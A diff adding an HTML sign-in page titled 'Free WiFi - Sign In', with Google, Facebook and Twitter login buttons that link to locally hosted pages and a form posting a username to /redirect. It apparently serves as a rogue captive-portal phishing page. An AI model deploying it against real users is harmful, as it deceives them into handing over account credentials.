@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<link rel="icon" type="image/png" href="assets/images/wifi.png">
+<html>
+<style>
+
+*{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    
+}
+
+body {
+    background-color: rgba(219, 217, 217);
+}
+
+.box {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate( -50%, -50%);
+    background-color: #fff;
+    height: 450px;
+    width: 400px;
+    border-radius: 10px;
+    box-shadow: rgba(0, 0, 0, 0.15) 1.95px 1.95px 2.6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    
+}
+
+button {
+    cursor: pointer;
+}
+
+.inner-box, .inner-box .btn {
+    display: flex;
+    align-items: center;
+}
+
+.inner-box {
+    width: 300px;
+    height: 440px;
+    flex-direction: column;
+    justify-content: space-evenly;
+    
+}
+
+.inner-box .btn {
+    width: 300px;
+    height: 40px;
+    background-color: transparent;
+    border-radius: 30px;
+    outline: none;
+    border: 1px solid rgb( 211, 210, 210);
+    font-weight: bold;
+    justify-content: center;
+
+}
+
+.inner-box button span {
+    display: block;
+    width: 160px;
+    text-align: left;
+}
+
+.inner-box button img {
+    margin: 0 .5rem;
+}
+
+.input-space {
+    display: block;
+    position:relative;
+    width: 300px;
+    height: 35px;
+    outline: none;
+    border: 1px solid rgb(211, 210, 210);
+    border-radius: 4px;
+    padding-left: 10px;
+
+}
+
+.inner-box input::placeholder {
+    font-size: 0.8rem;
+}
+
+.inner-box input:focus {
+    border: 2px solid #00acee;
+}
+
+.inner-box .button-1 {
+    background-color: #121212;
+    color: #fff;
+} 
+
+.last-line {
+    font-size: .7rem;
+    color: rgb(138, 136, 136);
+}
+
+.last-line a {
+    text-decoration: none;
+    color: #00acee;
+}
+</style>
+<head>
+<title>Free WiFi - Sign In</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+ <div class="box">
+        <div class="inner-box">
+            <img src="assets/images/wifi.png"
+            class="logo" width="50">
+            <a href="Google.html" style="text-decoration: none;"><button class="btn" type="submit"><img src="assets/images/Google.png" width="19"><span>Sign In with Google</span></button></a>
+            <a href="Facebook.html" style="text-decoration: none;"><button class="btn" type="submit"><img src="assets/images/Facebook.png" width="20"><span>Sign In with Facebook</span></button></a>
+            <a href="Twitter.html" style="text-decoration: none;"><button class="btn" type="submit"><img src="assets/images/Twitter.png" width="30"><span>Sign In with Twitter</span></button></a>
+            <p class="or">Or</p>
+          <form method="POST" action="/redirect">
+            <input type="email" name="username" class="input-space" placeholder="Phone, email, or username">
+            <input type="hidden" name="type" value="Email">
+            <button class="btn button-1" type="submit">Connect</button>
+          </form>
+
+</body>
+</html>
